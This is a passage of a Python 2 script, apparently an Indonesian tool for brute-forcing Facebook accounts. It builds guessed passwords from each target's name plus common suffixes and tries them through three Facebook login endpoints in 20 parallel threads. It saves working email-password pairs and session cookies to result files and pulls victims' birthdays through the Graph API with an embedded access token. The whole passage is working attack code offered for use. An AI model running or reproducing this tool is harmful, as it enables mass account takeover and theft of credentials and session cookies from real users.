            print '\n %s[%s×%s] y/t goblok!'%(N,M,N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
        global ok,cp,ttl,loop
        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params, headers=headers_)
            if re.search('(EAAA)\\w+', response.text):
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    ttl= az['birthday']
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global ok,cp,ttl,loop
        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            if 'checkpoint' in xo:
                try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    ttl= az['birthday']
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __mfb__(self, user, _yan_):
        global ok,cp,ttl,loop
        print '\r [%s%s%s] crack: %s/%s OK-:%s - CP-:%s '%(O,datetime.now().strftime('%H:%M:%S'),N,loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	user_agent = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	user_agent = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'user-agent': user_agent, 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            ses = requests.Session()
            ses.get('https://m.facebook.com/')
            ses.headers=headers_
            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s%s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
            	try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    ttl= az['birthday']
                except (KeyError, IOError):
                    ttl = ' '
                except: pass
                print '\r  %s* --> %s|%s %s              %s' % (K,user,pw,ttl,N)
                wrt = ' [×] %s|%s %s' % (user,pw,ttl)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1
        
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        		xz[3]+'123', xz[3]+'12345',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        		xz[3]+'123', xz[3]+'12345',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
        elif yan in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=20) as (__yayanXD__):
                for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                            	xz[0], xz[0]+'123', xz[0]+'1234',
                            	xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        	]
                        elif len(xz) == 3:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        	]
                        elif len(xz) == 4:
                        	raimuuu = [
                        		xz[0], xz[0]+'123', xz[0]+'12345',
                        		xz[1]+'123', xz[1]+'12345',
                        		xz[2]+'123', xz[2]+'12345',
                        		xz[3]+'123', xz[3]+'12345',
                        	]
                        else:
                        	raimuuu = [
                        		'sayang', 'anjing',
                        		'bismillah', '123456'
                        	]
                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass

            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
            os.remove(self.apk)
            hasil(ok,cp)
            exit()
            
if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
